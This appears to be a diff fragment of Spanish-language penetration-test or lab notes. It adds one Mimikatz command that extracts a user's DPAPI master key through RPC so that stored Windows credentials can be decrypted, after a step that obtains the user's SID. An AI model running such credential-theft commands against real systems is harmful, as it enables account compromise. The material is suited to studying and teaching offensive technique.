@@ -359,3 +359,4 @@ estaremos a la escucha
 `obtenemos el SID`
 ![[Pasted image 20240404213942.png]]
 
+dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
